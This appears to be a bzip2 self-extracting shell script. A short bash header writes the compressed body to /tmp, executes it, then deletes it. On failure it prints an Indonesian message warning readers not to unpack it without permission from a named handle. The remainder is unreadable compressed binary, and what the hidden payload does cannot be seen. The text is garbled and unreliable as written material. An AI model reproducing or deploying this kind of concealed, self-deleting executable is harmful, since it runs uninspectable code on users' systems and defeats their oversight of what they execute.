#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�� �_�m}�����������PD@  `���A���0"��( P*�P�@eI�C	��G���h�2a 444 bd�� � h�  h�@  d� �4  Mh  �L�4@�4�  i�M d  4i�a�b�I�h�i=OI����?Q�i�F��=C���OQ7�G�@�($H�h�4L�S4&MS�g�M� �����4i����4��I���<��$��렫!Ҙ[���em�$}E%L�ꯪ��-1 �LfI\8*���14�$E?w��Ѭ���O�Aq���U�qXH��w���#��a�0$�Rj�����ǍW߹�K?�W��eq��1�Lh�%���Pզ��-YU:۴�	@^]|� �oIE.C�a͘� ���L &�$�Ha#}7+	�ܰ;� q�#�	�:��"�<ĕ��w�~���4Ҥ�no\�KX&d���c�n���2�?.�2G���vZ�n�J�g�Hi�+Ep�f~��MU���O�$l`�nab½�:�JD|8В$����o���K��:����A�4z���)�8$B���?�ϖ�}���V�P�":�AK��Z|�|;K�@�p:ǣ.���t(x��q
���9z�ԻnC���|�Hjl8����,f,@���� ��ȃ dv��l�'����6�p�lN<�ɝ�X�����13I���[�h.�2�g(_~޶������H`85�7+��th��M�t�7Y���v��p)@�!�(�c�LĊ2�~�\�|\�N��?��>�{�[80�o�! �A��@�l��aes⍇y�@w1#�D$��L(K�)�iDL�����C�iՏ���^�����D¯x�hx�E53�y9�8[�\���q��ED��� ���e�ߗe0,�����|=O_�g�����>�b�tc��kz�Qyii�eǏ�n7��PR�D��3<�=8�����wcPa���y�7|�zCPo�hܩ4�s��_-� �N�v��9�Rc��rV����{*�ow�N��NjsJ��1�شZh=���i >�F�cԊ��m���hr<�����Y��w��-6%��)�W��4iҡ6�m��X��b�3������n�U)��#דP�����>yA'(�����hG�*4�Vn�
Ж��	����o������J���+�	nNC%B�B��ͻ��lL��5x���y��u�W�Jdj%Dx����)[T�d%v4G�+7�=�*>#�^�������Ţ�s_@f���=����rB'
���x� 2"q"���Ĺ�1A�k�h�}R�.-*HI�2��w7K��O�
j��
D_��p���3`��B�����	�˛�`�OQ����L���Ox�H�k��_��D�J���Xq����������2F�V"c��^1!������.�[
�+Ҏn�B�TC�Y�T(<P�@�<��Fy헒��X�Y�F�&���`k#�RQLN���A�*��ahpa���Nm6s�OQ�:��x��1o^�w81��b�i���CoƖ!1�4}9?I,�����KvCq�"���57��Xv�t��;��S�>�+��4���؈S�����W��נR���#�,5^e� eF��{O�^��<�h��Smo��;����P�nv	���X:�砰0�	0��-!��$zM%��ĸ�â8+`֗�J) �V�����=�w���dN�`øT����Z�Gd�Tl��I�kH6�t���X�$��[(����M��a"KӭFfm��T̀�M$�S���Uf�ִ�^Aͭ�֮�s�[�(��Z}s66��q\�W���%��3*P�F��Im|�]-��=��i�J���Q*�L���\VRE���(@��:�����1���A�(P��@j�۳���J+��"=-.�h�S9*��a���҆llK@�K *u\HΓ��̆���5�K2�JX6�m�ފ+�K�R:��p9 ����q�B�@�9�����ר;�l�Q�R�S`Y�hVA�h��9�����j8�t
v�H�	
��Y�h�=�6$�+ɻ5�m5����6s������f�Iw�x���!� �[��(d$��4g�����f�%:�Y����fe�
�&8�1�8��37����oIe�v�ǴY�w�E�Ē�\��3x�b[���C[�@�e��0ZE&�+f�Yc Ҏ��F�d���:X+v�.IJқ�Ea�0lU����
�i�C9�Iz:9gx�xJ����R�R�E��d����L����D{�:�B9=�g��BZ�F��d��L�͢�IB��dm�1��DJ`H�6b�J��U��`A$�EV(y,=Ā��0������
j� ���C�ci%X
���Y�dP'�۴�i)��vDl�l�B�� �2Q{cE��|�K�6`i˪G��H;��~14����O����L�w�b@h��6�݉�������{;x��]�j�/	|���qj�kP�p04�#�%+�QB���H�����4�Ώ m��-FӐq^�Bd0L���&N�Z[g`�����f*�,	+�Z�B���b*.3��KyB~�4�#,�Z�K2�K����cfIv�}衲�Y:$����X�֊�C	��h�˵���!{��5P�-	H�3�M�H��Hd������#"g'��Q�`����,,.�,I�]� �X��1�Li�$�a2�̅�Jc�{�T��%bdI��;6V#BL�׽��+�e�=Zt��T᭼vC�#YB`s��j��^`bm�����eAC`+�2���J��;G��'�-L��z0>^���>���Ý	8��O��G �u��C�B�[�wR+�w�	�+��SahaX��khI��L36��ҋM ��"^(�����#�D��*ٖm����&B!D@=�%�_�C�N߬OX*�@� @��M��=hP�"��.*��)
�w$S�	��0